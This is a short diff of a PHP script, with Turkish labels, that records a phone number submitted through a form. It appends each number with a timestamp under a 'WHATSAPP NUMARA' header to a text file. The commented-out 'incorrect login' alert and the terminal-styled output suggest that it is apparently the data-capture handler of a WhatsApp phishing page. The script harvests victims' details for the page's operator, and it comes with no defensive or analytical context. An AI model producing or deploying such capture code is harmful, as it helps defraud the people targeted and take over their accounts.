@@ -5,15 +5,17 @@ if (isset($_POST['numara'])) {
 
 $save = fopen("numara.txt","a+");
 $numara = $_POST['numara'];
+date_default_timezone_set('Europe/Istanbul');
+$tarih = date('d/m/Y H:i:s');
 $vericekilen = ("
-\e[32m
-	████████████████████████████████████████
-	██
-	██ \e[97mNUMARA : \e[32m".$numara."\e[32m
-	██
-	████████████████████████████████████████\e[97m
-        
-	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
++-+-+ WHATSAPP NUMARA +-+-+
+
+ Tarih         : ".$tarih."
+
+ Numara        : ".$numara."
+
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+");
 fwrite($save,$vericekilen);
 fclose($save);
 //echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";
